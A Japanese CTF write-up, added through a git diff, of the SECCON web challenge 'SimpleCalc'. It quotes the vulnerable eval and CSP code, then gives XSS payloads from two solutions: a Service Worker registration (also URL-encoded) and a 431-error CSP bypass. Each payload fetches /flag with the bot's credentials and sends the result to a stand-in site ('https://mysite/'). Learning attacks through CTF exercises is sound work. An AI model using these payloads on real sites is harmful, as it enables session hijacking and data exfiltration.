@@ -14,6 +14,9 @@ Web問は後で復習します。
 
 - [misc/readme 2023](#miscreadme-2023)
 - [web/Bad JWT](#webbad-jwt)
+- [web/SimpleCalc](#websimplecalc)
+  - [[web/SimpleCalc] 解法1](#websimplecalc-解法1)
+  - [[web/SimpleCalc] 解法2](#websimplecalc-解法2)
 
 <!-- /code_chunk_output -->
 
@@ -287,3 +290,156 @@ SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
 - 所感
 
 後から解法を見て分かったが、なぜ`constructor`に気づかなかったのか。
+
+## web/SimpleCalc
+
+23 solved / 193 points
+
+シンプルなXSS問題だが解けなかった。
+
+- 該当箇所（クライアント側）: `src/static/js/index.js`
+
+```js
+const params = new URLSearchParams(location.search);
+const result = eval(params.get('expr'));
+document.getElementById('result').innerText = result.toString();
+```
+
+- 該当箇所（サーバ側）: `src/index.js`
+
+```js
+app.use((req, res, next) => {
+  const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
+  res.header("Content-Security-Policy", `default-src ${js_url} 'unsafe-eval';`);
+  next();
+});
+```
+
+```js
+app.get("/flag", (req, res) => {
+  console.log(req.url, req.cookies, req.get("X-FLAG"));
+  if (req.cookies.token !== ADMIN_TOKEN || !req.get("X-FLAG")) {
+    return res.send("No flag for you!");
+  }
+  return res.send(FLAG);
+});
+
+app.post("/report", reportLimiter, async (req, res) => {
+  const { expr } = req.body;
+
+  const url = new URL(`http://localhost:${PORT}/`);
+  url.searchParams.append("expr", expr);
+
+  try {
+    await visit(url);
+    return res.sendStatus(200);
+  } catch (err) {
+    console.error(err);
+    return res.status(500).send("Something wrong");
+  }
+});
+```
+
+exprパラメータに入力した式をevalしていることが分かる。  
+フラグを取得するには、`/flag`にアクセスする際に以下の条件が必要。
+
+- クッキーに`ADMIN_TOKEN`を付ける。
+- リクエストヘッダに`X-FLAG`を付ける。
+
+また、CSPヘッダとして`Content-Security-Policy: default-src http://<target>:3000/js/index.js 'unsafe-eval';`がある。
+
+リクエストヘッダが厄介で、XHRやfetch等によってヘッダを付与する必要がある。
+しかし、connect-srcも制限されるため、指定されているsrc以外では以下が使えない。
+
+- a, ping
+- fetch()
+- XMLHttpRequest
+- WebSocket
+- EventSource
+- Navigator.sendBeacon()
+
+参考: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src>
+
+それがなければ以下のペイロードで終われた。
+
+```js
+var form = document.createElement('FORM');
+form.method='GET';
+form.action='/flag';
+form.target='newWindow';
+document.body.appendChild(form);
+let w = window.open("","newWindow");
+form.submit();
+setTimeout(()=>{
+  document.location= `https://mysite/?c=${w.document.body.innerHTML}`
+},500);
+```
+
+そのため、別の方法を考える必要がある。  
+後から他の人のWriteupを見て2パターンの方法があるっぽい。  
+Service Workerの方法は試していたが、やり方が間違っていたらしく惜しかった。
+
+### [web/SimpleCalc] 解法1
+
+Service Workerを使う方法。想定解法らしい。  
+どおりで`Note: Don't forget that the target host is localhost from the admin bot.`と書いてあったのかと思った。  
+Service Workerはhttpsかlocalhostでしか使えないためと思われる。
+
+- 手順
+
+1. evalでService Workerを登録する。
+1. Service Workerにリクエストを送り、スクリプトを埋め込んだHTMLを返させる。
+1. /flagへfetchが実行される。
+1. レスポンスの内容を自身のサイトに飛ばす。
+
+- Service Worker内で動かすスクリプト
+  - リクエスト判別のため、if文を入れている。
+  - documentは何かしら返さないとエラーになるっぽい。
+
+```js
+self.addEventListener("fetch", (e) => {
+    if (e.request.url.endsWith("/test")){
+        let res = "<script>fetch('/flag',{headers:{'X-FLAG':'a'},credentials:'include'}).then(res=>res.text()).then(flag=>location='https://mysite/?q='+flag)</script>";
+        e.respondWith(new Response(res, {headers:{'Content-Type':'text/html'}}));
+    }
+});
+document = {}
+document.getElementById = () => {return {innerText:""}}
+```
+
+- 実際のペイロード
+  - URLにそのまま上のスクリプトを入れると上手く動かないので、URLエンコードしている。Base64でも良さそう？
+
+```js
+var src = 'self%2EaddEventListener%28%22fetch%22%2C%20%28e%29%20%3D%3E%20%7B%0A%20%20%20%20if%20%28e%2Erequest%2Eurl%2EendsWith%28%22%2Fjs%2Ftest%22%29%29%7B%0A%20%20%20%20%20%20%20%20let%20res%20%3D%20%22%3Cscript%3Efetch%28%27%2Fflag%27%2C%7Bheaders%3A%7B%27X%2DFLAG%27%3A%27a%27%7D%2Ccredentials%3A%27include%27%7D%29%2Ethen%28res%3D%3Eres%2Etext%28%29%29%2Ethen%28flag%3D%3Elocation%3D%27https%3A%2F%2Fmysite%2F%3Fq%3D%27%2Bflag%29%3C%2Fscript%3E%22%3B%0A%20%20%20%20%20%20%20%20e%2ErespondWith%28new%20Response%28res%2C%20%7Bheaders%3A%7B%27Content%2DType%27%3A%27text%2Fhtml%27%7D%7D%29%29%3B%0A%20%20%20%20%7D%0A%7D%29%3B%0Adocument%20%3D%20%7B%7D%0Adocument%2EgetElementById%20%3D%20%28%29%20%3D%3E%20%7Breturn%20%7BinnerText%3A%22%22%7D%7D';
+var sw = `/js/index.js?expr=${src}`;
+navigator.serviceWorker.register(sw);
+setInterval(()=>{location='/js/test'},2000);
+```
+
+### [web/SimpleCalc] 解法2
+
+431エラーを出して、CSPヘッダを出力させなくする方法。  
+431エラーである必要は無いと思うが、今回の問題ではこれが使われていた。  
+
+- 手順
+
+1. iframeのsrcにパラメータ数が上限を超えたリクエストを送り431エラーを出す。
+1. iframe経由でfetchが使えるので、`X-FLAG`ヘッダをつけたリクエストを送信する。
+1. レスポンスの内容を自身のサイトに飛ばす。
+
+```js
+var f=document.createElement('iframe');
+f.src = `http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;
+document.body.appendChild(f);
+f.onload = () => {
+    f.contentWindow.fetch('/flag', { headers: {'X-FLAG': 'a'}, credentials:'include' })
+        .then(res => res.text())
+        .then(flag => location='https://mysite/?q='+flag)
+}
+```
+
+- 所感
+
+復習がてらService Worker調べてみたが少しだけ使い方が分かったので良かった。  
+あと最近はWebhook.siteを使う人が多い？
